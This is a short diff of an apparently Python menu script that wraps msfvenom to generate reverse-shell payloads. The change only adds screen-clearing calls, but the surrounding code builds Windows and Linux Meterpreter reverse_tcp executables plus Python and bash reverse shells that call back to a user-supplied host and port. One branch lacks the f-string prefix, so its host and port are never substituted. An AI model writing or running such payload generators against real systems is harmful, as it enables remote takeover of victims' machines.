@@ -19,20 +19,32 @@ if options == "1":
 5. Exit
 > """))
     if payload_options == "1":
+        clear()
         LHOST = str(input("Host IP to connect to:\n> "))
+        clear()
         LPORT = str(input("Port:\n> "))
+        clear()
         os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > shell.exe")
     elif payload_options == "2":
+        clear()
         LHOST = str(input("Host IP to connect to:\n> "))
+        clear()
         LPORT = str(input("Port:\n> "))
+        clear()
         os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf > shell.elf")
     elif payload_options == "3":
+        clear()
         LHOST = str(input("Host IP to connect to:\n> "))
+        clear()
         LPORT = str(input("Port:\n> "))
+        clear()
         os.system(f"msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={LPORT} -f raw > shell.py")
     elif payload_options == "4":
+        clear()
         LHOST = str(input("Host IP to connect to:\n> "))
+        clear()
         LPORT = str(input("Port:\n> "))
+        clear()
         os.system("msfvenom -p cmd/unix/reverse_bash LHOST={LHOST} LPORT={LPORT} -f raw > shell.sh")
     elif payload_options == "5":
         sys.exit()
